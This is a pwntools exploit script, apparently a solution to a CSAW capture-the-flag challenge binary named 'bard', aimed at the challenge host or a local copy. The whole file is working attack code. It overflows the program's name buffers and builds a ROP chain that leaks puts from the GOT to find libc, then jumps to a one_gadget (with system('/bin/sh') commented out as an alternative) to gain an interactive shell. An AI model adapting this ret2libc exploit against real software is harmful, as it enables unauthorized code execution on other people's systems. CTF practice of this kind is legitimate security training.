from pwn import *

context.update(arch='amd64', os='linux')
context.terminal = ['iterm2', 'new-window']

HOST, PORT = 'pwn.chal.csaw.io', 5019
BINARY = './bard'
LIBC = './libc-2.27.so'

elf  = ELF(BINARY)
libc = ELF(LIBC,checksec=False)

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = remote('127.0.0.1',9997)



def good_1(name):
	p.recvuntil('evil):\n')
	p.sendline('g')
	p.recvuntil('accuracy\n')
	p.sendline('1')
	p.recvuntil('name:\n')
	p.sendline(name)

def good_2(name):
        p.recvuntil('evil):\n')
        p.sendline('g')
        p.recvuntil('accuracy\n')
        p.sendline('2')
        p.recvuntil('name:\n')
        p.sendline(name)

def bad_1(name):
        p.recvuntil('evil):\n')
        p.sendline('e')
        p.recvuntil('disappointment\n')
        p.sendline('1')
        p.recvuntil('name:\n')
        p.sendline(name)

def bad_2(name):
        p.recvuntil('evil):\n')
        p.sendline('e')
        p.recvuntil('disappointment\n')
        p.sendline('2')
        p.recvuntil('name:\n')
        p.sendline(name)

def good_run():
        for i in range(10):
                p.recvuntil('(r)un\n')
                p.sendline('r')

rop = ROP(elf)
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']

pop_rdi = (rop.find_gadget(['pop rdi','ret']))[0]
ret = (rop.find_gadget(['ret']))[0]

bad_1('A'*31)
bad_1('A'*31)
bad_1('A'*31)
bad_1('A'*31)
bad_1('A'*31)

bad_1('A'*31)
bad_1('A'*31)

good_1('2'+'B'*0x19)
bad_2('')

payload = p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p32(0x00400f7c)
good_2(payload)
good_run()

leak = u64(p.recvuntil('Bard').split('y.\n')[1][:-6].ljust(8,'\x00'))
info('puts: %s', hex(leak))

libc.address = leak - libc.symbols['puts']
info('libc address: %s',hex(libc.address))

binsh = next(libc.search("/bin/sh"))

system = libc.sym["system"]


bad_1('A'*31)
bad_1('A'*31)
bad_1('A'*31)
bad_1('A'*31)
bad_1('A'*31)

bad_1('A'*31)
bad_1('A'*31)

good_1('2'+'B'*0x19)
bad_2('')

#payload = p32(ret)
one_gadget = 0x4f365  #rcx == NULL
one_gadget = 0x4f3c2  #[rsp+0x40] == NULL
one_gadget  = 0x10a45c #[rsp+0x70] == NULL


payload = p64(libc.address + one_gadget)
# payload = p64(pop_rdi)
# payload += p64(binsh)
# payload += p64(system)
pause()
good_2(payload)
good_run()


p.interactive()
